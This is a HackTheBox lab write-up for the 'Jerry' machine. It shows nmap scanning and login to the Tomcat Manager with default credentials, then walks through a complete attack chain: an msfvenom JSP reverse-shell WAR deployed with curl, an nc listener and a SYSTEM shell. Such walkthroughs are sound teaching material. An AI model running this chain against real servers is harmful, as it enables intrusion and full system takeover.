Jerry

HackTheBox · Easy by Brenno M.

Jerry exposes the Tomcat Manager with default credentials. The Manager lets us deploy a WAR file, and Tomcat runs as SYSTEM, so deploying a malicious WAR hands over the whole box.

Reconnaissance

Only port 8080 answers, with Apache Tomcat 7.0.88.

nmap -Pn -n -sT --min-rate 1500 -p- <IP>
nmap -Pn -n -sT -sV -sC -p8080 <IP>
# 8080 Apache Tomcat/Coyote JSP engine 1.1 (Tomcat 7.0.88)

/manager/html asks for basic auth. If we cancel, Tomcat's own 401 page shows the sample config with tomcat / s3cret, which was never changed. Metasploit's tomcat_mgr_login reaches the same pair by trying the default list.

curl -s -u tomcat:s3cret http://<IP>:8080/manager/text/list
# OK - Listed applications for virtual host localhost

Exploitation - WAR deploy

We build a WAR with a JSP reverse shell and deploy it through the Manager's text interface. Requesting the app triggers the connection, already as NT AUTHORITY\SYSTEM.

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<MY_IP> LPORT=4444 -f war -o shell.war
curl -u tomcat:s3cret --upload-file shell.war "http://<IP>:8080/manager/text/deploy?path=/shell"
nc -lvnp 4444
curl http://<IP>:8080/shell/

Both flags are in the same file, on the Administrator's desktop.

whoami   # nt authority\system
type "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"
